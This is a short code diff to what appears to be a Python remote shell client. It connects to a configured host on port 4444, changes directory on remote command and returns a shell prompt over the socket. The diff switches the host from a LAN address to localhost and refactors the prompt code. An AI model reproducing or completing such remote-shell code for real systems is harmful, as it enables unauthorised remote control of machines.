@@ -1,4 +1,4 @@
-host = '192.168.17.128'
+host = '127.0.0.1'
 port = 4444
 
 import os
@@ -39,11 +39,7 @@ if __name__ == '__main__':
         elif first == 'cd':
             try:
                 os.chdir(other[1])
-                prompt = os.getcwd()
-                if 'Linux' in systemv:
-                    prompt +='$'
-                else:
-                    prompt +='>'
+                prompt = getprompt()
                 client.send(prompt.encode('gbk'))
             except Exception:
                 client.send(prompt.encode('gbk'))
